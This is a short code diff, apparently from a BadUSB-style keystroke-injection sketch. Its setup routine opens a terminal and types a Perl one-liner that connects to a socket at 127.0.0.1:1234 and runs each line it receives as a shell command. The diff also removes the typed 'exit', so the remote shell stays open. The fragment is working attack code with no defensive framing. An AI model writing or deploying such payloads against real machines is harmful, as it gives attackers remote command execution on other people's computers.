@@ -11,8 +11,8 @@ void setup() {
   delay(1000);
 
   openTerminal();
+  delay(50);
   type("perl -MIO::Socket -e'$c=new IO::Socket::INET(\"127.0.0.1:1234\");print $c `$_`while<$c>'");
-  type("exit");
 }
 
 // universal
